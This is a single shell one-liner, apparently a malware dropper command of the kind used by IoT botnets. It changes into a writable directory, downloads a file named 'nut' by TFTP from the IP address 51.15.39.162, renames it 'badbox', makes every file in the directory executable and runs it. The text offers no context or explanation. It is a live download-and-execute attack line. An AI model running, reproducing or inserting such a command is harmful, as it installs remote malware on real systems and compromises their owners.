cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r nut -g 51.15.39.162;cat nut >badbox;chmod +x *;./badbox
